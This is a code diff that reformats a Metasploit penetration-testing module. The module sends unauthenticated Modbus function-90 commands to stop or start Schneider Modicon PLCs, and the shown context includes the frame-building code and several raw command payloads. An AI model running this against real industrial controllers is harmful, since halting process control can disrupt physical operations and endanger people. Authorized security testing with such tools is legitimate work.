@@ -8,55 +8,62 @@ class MetasploitModule < Msf::Auxiliary
   include Rex::Socket::Tcp
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Schneider Modicon Remote START/STOP Command',
-      'Description'   => %q{
-        The Schneider Modicon with Unity series of PLCs use Modbus function
-        code 90 (0x5a) to perform administrative commands without authentication.
-        This module allows a remote user to change the state of the PLC between
-        STOP and RUN, allowing an attacker to end process control by the PLC.
+    super(
+      update_info(
+        info,
+        'Name' => 'Schneider Modicon Remote START/STOP Command',
+        'Description' => %q{
+          The Schneider Modicon with Unity series of PLCs use Modbus function
+          code 90 (0x5a) to perform administrative commands without authentication.
+          This module allows a remote user to change the state of the PLC between
+          STOP and RUN, allowing an attacker to end process control by the PLC.
 
-        This module is based on the original 'modiconstop.rb' Basecamp module from
-        DigitalBond.
-      },
-      'Author'         =>
-        [
+          This module is based on the original 'modiconstop.rb' Basecamp module from
+          DigitalBond.
+        },
+        'Author' => [
           'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
           'todb' # Metasploit fixups
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
         ],
-      'DisclosureDate' => '2012-04-05'
-      ))
+        'DisclosureDate' => '2012-04-05',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
     register_options(
       [
-        OptEnum.new("MODE", [true, 'PLC command', "STOP",
+        OptEnum.new('MODE', [
+          true, 'PLC command', 'STOP',
           [
-            "STOP",
-            "RUN"
+            'STOP',
+            'RUN'
           ]
         ]),
         Opt::RPORT(502)
-      ])
-
+      ]
+    )
   end
 
   # this is used for building a Modbus frame
   # just prepends the payload with a modbus header
   def makeframe(packetdata)
     if packetdata.size > 255
-      print_error("packet too large, sorry")
-      print_error("Offending packet: " + packetdata)
+      print_error('packet too large, sorry')
+      print_error('Offending packet: ' + packetdata)
       return
     end
-    payload = ""
-    payload += [@modbuscounter].pack("n")
-    payload += "\x00\x00\x00" #dunno what these are
-    payload += [packetdata.size].pack("c") # size byte
-    payload += packetdata
+    payload = ''
+    payload += [@modbuscounter].pack('n')
+    payload += "\x00\x00\x00" # dunno what these are
+    payload += [packetdata.size].pack('c') # size byte
+    payload + packetdata
   end
 
   # a wrapper just to be sure we increment the counter
@@ -88,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     payload = "\x00\x5a\x00\x01\x00"
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x00\x0a\x00"
-    (0..0xf9).each { |x| payload += [x].pack("c") }
+    (0..0xf9).each { |x| payload += [x].pack('c') }
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x00\x04"
     sendframe(makeframe(payload))
@@ -119,8 +126,8 @@ class MetasploitModule < Msf::Auxiliary
     payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
-    payload += "USER-714E74F21B" # Yep, really
-    #payload += "META-SPLOITMETA"
+    payload += 'USER-714E74F21B' # Yep, really
+    # payload += "META-SPLOITMETA"
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x01\x04"
     sendframe(makeframe(payload))
@@ -167,12 +174,12 @@ class MetasploitModule < Msf::Auxiliary
     connect
     init
     case datastore['MODE']
-    when "STOP"
+    when 'STOP'
       stop
-    when "RUN"
+    when 'RUN'
       start
     else
-      print_error("Invalid MODE")
+      print_error('Invalid MODE')
       return
     end
   end
